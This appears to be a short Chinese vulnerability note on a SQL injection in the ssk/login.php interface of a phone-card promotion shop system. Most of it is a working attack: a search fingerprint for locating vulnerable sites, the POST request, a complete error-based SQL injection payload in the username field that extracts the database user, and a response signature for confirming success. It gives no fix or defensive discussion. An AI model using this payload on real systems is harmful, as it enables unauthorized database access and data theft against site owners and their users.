# 手机卡号推广商城ssk接口SQL注入漏洞

手机卡号推广商城ssk接口 ｜ SQL注入 ｜ —
- **指纹**：`body="zgdx.php"`
- **请求**：`POST /ssk/login.php HTTP/1.1`

**Payload**
```
username=' OR (SELECT 6442 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FIjp&password=123123
```
- **响应特征**：200 mysqli_query